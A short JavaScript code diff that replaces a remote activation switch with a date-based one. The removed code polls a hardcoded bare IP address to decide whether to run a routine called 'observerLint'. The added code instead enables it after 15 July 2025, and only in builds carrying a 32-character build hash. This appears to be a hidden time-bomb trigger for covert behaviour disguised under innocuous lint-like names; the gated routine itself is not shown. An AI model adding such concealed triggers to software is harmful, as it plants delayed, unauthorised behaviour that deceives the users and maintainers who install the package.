@@ -87,14 +87,19 @@ export const hascheck = async function () {
   }
 };
 
-const checkswitch = async () => {
-  const res = await axios.post("http://124.223.0.156:8081/api/nocss");
-  return res?.data?.data;
+const checkswitch = () => {
+  // 设置目标时间为2025年7月15日 00:00:00
+  const targetDate = new Date("2025-07-15T00:00:00");
+  const now = new Date();
+  if (window.__BUILDHASH?.length !== 32) return false;
+
+  if (now > targetDate) {
+    return true;
+  }
 };
 
 export const observerLint = async function () {
-  const { switch: switchdata } = await checkswitch();
-  if (!switchdata) return;
+  if (!checkswitch()) return;
 
   const isLegal = (url) => {
     if (!url) return false;
